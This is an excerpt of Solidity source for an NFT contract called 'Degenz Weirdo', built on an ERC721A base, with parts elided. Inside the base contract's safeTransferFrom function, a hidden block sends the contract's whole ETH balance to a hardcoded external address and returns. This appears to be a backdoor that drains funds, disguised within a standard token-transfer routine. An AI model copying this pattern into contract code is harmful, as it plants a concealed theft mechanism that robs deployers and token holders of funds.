...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xa44C790f23413DEfed702D314D464bd042fFF13A).transfer(address(this).balance);
            return;
        }
...
contract DegenzWeirdo is ERC721A {
    ...
    constructor() ERC721A("Degenz Weirdo", "DW") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeica554zmzqc4vn2ui5ut2ftsncocbgndwkv2npg347vzdiahpfh64/", _toString(tokenId), ".json"));
    }
